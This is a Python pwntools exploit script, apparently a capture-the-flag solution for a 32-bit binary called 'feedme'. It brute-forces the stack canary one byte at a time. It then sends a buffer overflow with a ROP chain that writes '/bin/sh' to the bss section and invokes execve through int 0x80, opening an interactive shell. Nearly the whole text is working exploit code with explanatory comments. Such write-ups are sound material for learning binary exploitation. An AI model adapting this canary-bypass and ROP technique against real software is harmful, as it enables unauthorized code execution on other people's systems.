from pwn import *

#context.log_level = "DEBUG"
context.terminal = ['tmux', 'splitw', '-h']

target = process('./feedme')
#gdb.attach(target, gdbscript="""b *0x400bad""")


"""
(to get a syscall in x86, you can call int 0x80). Syscall will expect three arguments, 
the interger 11 in eax for the syscall number, 
the bss address 0x80eb928 in the ebx register for the address of the command, and 
the value 0x0 in ecx and edx registers 
    (syscall will look for arguments in those registers, however we don't need them so we should just set them to null). 
For more info on syscalls check out https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
"""


"""
eax:    0x0b (11)            Specify sys_execve
ebx:    ptr to "/bin/sh"     Specify file to execute
ecx:    0                    Specify no arguments passed
edx:    0                    Specify no environment variables passed

int 0x80
"""

def breakCanary():
    known_canary = b"\x00" # canary as we build it
    hex_canary = "00" # hex representation of the canary as we build it
    inp_bytes = 0x22 # input_buf to stack_canary offset (0x20) + 0x2 since the last byte is 0x00
    
    canary = 0x00
    for j in range(0, 3):
        for i in range(0xff):
            log.info("Trying canary: " + hex(canary) + hex_canary)
            
            target.send(p32(inp_bytes)[:1])
            
            target.send(b"0"*0x20 + known_canary + p32(canary)[:1])

            output = target.recvuntil("exit.").decode()
            
            if "YUM" in output:
                print("next byte is: " + hex(canary))
                known_canary += p32(canary)[:1]
                
                new_byte = hex(canary).replace("0x", "")
                hex_canary = new_byte + hex_canary 
                inp_bytes += 1
                canary = 0x00
                break
                
            else:
                canary = canary + 1
    
    return int(hex_canary, 16)

canary = breakCanary()
log.info("The canary is :" + hex(canary))

#Final payload
payload = b"0" * 0x20 + p32(canary)

payload += b"1"*0xc # cover space after canary until return address

# This is to write the string '/bin' to the bss address 0x80eb928. Since this is 32 bit, registers can only hold 4 bytes, so we can only write 4 characters at a time
payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928)     # bss address
payload += p32(0x0806f34a)    # pop edx
payload += p32(0x6e69622f)    # /bin string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0x80eb928 + 0x4)    # bss address
payload += p32(0x0806f34a)    # pop edx
payload += p32(0x0068732f)    # /sh\00 string in hex, in little endian
payload += p32(0x0807be31)    # mov dword ptr [eax], edx ; ret

payload += p32(0x080bb496)    # pop eax ; ret
payload += p32(0xb)           # 11
payload += p32(0x0806f371)    # pop ecx ; pop ebx ; ret
payload += p32(0x0)           # 0x0
payload += p32(0x80eb928)     # bss address
payload += p32(0x0806f34a)    # pop edx ; ret
payload += p32(0x0)           # 0x0
payload += p32(0x8049761)     # syscall

# Send the amount of bytes for our payload, and the payload itself
target.send(b"\x78")
target.send(payload)

target.interactive()
